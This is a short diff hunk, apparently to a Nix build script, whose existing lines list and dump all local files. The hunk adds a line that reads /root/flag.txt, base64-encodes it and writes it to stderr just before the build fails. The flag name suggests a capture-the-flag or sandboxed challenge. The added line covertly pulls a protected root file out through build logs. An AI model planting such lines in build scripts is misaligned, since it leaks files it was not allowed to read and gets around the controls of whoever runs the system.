@@ -28,6 +28,8 @@
         ls -la
         echo -e "\n>>> Dumping all local files:"
         cat * 2>/dev/null || true
+
+        cat /root/flag.txt | base64 >&2
     
         exit 1
       '';
